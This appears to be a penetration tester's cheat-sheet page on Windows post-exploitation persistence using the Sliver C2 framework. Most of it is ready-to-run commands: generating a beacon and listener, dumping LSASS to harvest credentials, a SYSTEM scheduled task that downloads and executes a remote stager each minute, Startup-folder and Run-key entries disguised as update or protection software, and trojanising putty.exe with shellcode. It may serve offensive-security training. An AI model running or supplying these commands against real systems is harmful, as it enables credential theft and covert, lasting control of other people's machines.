# Persistance

Having access to a host with for example we can work on persistance by starting up with a beacon and listener.

```sh
generate beacon --http 10.10.14.120:9001 --skip-symbols --os windows -N http-beacon-9001
```

And the listener

```sh
http -L 10.10.14.62 -l 9001
```

When running as an Administrator

* `info` = get info
* `interactive` = Create session then `use <session id>`
* `getsystem` = Spawn a new session running as NT
* `hashdump` = `use <session id>` then get hashes.

Or dump LSASS

```sh
# Dump LSASS
sliver (http-beacon) > ps -e lsass

 Pid   Ppid   Owner                 Arch     Executable   Session 
===== ====== ===================== ======== ============ =========
 660   524    NT AUTHORITY\SYSTEM   x86_64   lsass.exe    0
 
sliver (http-beacon) > procdump --pid 660 --save /tmp/lsass.dmp

[*] Process dump stored in: /tmp/lsass.dmp

# Pypykatz
pypykatz lsa minidump /tmp/lsass.dmp 
```

## Persistance

We can achieve persistance with running scheduled task or other methods that runs every once in a while.

{% hint style="info" %}
Usin g WMI events by having a "normal" spawn of `calc.exe`, for example, can open the calculator application and start the `http-beacon.exe` file
{% endhint %}

See for more techniques [https://attack.mitre.org/tactics/TA0003/](https://attack.mitre.org/tactics/TA0003/).

### <mark style="color:yellow;">Scheduled tasks</mark>

Preparing our payload for scheduled tasks we have to encodig to UTF-16LE as powershell uses this.

```powershell
echo -en "iex(new-object net.webclient).downloadString('http://10.10.14.120:8088/stager.txt')" | iconv -t UTF-16LE | base64 -w 0
aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADYAMgA6ADgAMAA4ADgALwBzAHQAYQBnAGUAcgAuAHQAeAB0ACcAKQA=
```

Now we can use schtaks cmdlet to create a task. We call it SecurityUpdate:

* `/sc` = schedule frequency
* `/mo` = frequency of repeating taks
* `/tn` = name of taks
* `/ru` = user context under which task runs

```sh
sliver (http-beacon) > execute powershell 'schtasks /create /sc minute /mo 1 /tn SecurityUpdater /tr "powershell.exe -enc aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADYAMgA6ADgAMAA4ADgALwBzAHQAYQBnAGUAcgAuAHQAeAB0ACcAKQA=" /ru SYSTEM'
```

### <mark style="color:yellow;">Logon activity</mark>

Once a user logs in to the operating system, a specific payload is executed. We can insert a backdoor activity into the `Startup` folder and registry. Each user's Startup folder is in `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`. If we drop a file here, the file will be executed every time the user logs in.

```powershell
sharpersist -- -t startupfolder -c \"powershell.exe\" -a \"-nop -w hidden iex(new-object net.webclient).downloadstring(\'http://10.10.14.62:8088/stager.txt\')\" -f \"Edge Updater\" -m add
```

### <mark style="color:yellow;">Run and RunOnce</mark>

Specify a program when a user logins by editing registry.

<details>

<summary>Registry items</summary>

* HKCU\Software\Microsoft\Windows\CurrentVersion\Run
* HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
* HKLM\Software\Microsoft\Windows\CurrentVersion\Run
* HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

</details>

```sh
sharpersist -- -t reg -c \"powershell.exe\" -a \"-nop -w hidden iex(new-object net.webclient).downloadstring(\'http://10.10.14.62:8088/staged.txt\')\" -k \"hklmrun\" -v \"AdvancedProtection\" -m add
```

### <mark style="color:yellow;">Backdoor</mark>

Using the backdoor function in Sliver we can bakdoor binaries like putty.exe to run our shellcode. It can alter behaviour of the binary so that it wont even start.

```sh
# New profile
sliver (http-beacon) > profiles new --format shellcode --http 10.10.14.62:9002 persistence-shellcode
[*] Saved new implant profile persistence-shellcode

# HTTP Listener
sliver (http-beacon) > http -L 10.10.14.62 -l 9002
[*] Starting HTTP :9002 listener ...
[*] Successfully started job #3

# Create backdoor
sliver (http-beacon) > backdoor --profile persistence-shellcode "C:\Program Files\PuTTY\putty.exe"
[*] Uploaded backdoor'd binary to C:\Program Files\PuTTY\putty.exe
```
